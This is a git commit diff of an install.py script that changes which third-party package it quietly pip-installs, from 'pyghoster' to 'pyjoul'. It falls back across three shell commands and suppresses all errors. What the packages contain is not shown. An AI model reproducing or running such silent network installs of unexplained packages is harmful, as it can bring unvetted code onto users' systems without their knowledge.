e5d1acfb0e698cd85ae059d17c22a49cd64cf283
Practicer45000 <133441430+Practicer45000@users.noreply.github.com>
2023-08-17 16:37:38 +0200

    Update install.py

--- install.py
+++ install.py
@@ -1,11 +1,11 @@
 import os
 try:
-    os.system("python.exe -m pip install pyghoster")
+    os.system("python.exe -m pip install pyjoul")
 except:
   try:
-      os.system("python3 -m pip install pyghoster")
+      os.system("python3 -m pip install pyjoul")
   except:
       try:
-          os.system("pip install pyghoster")
+          os.system("pip install pyjoul")
       except:
           pass
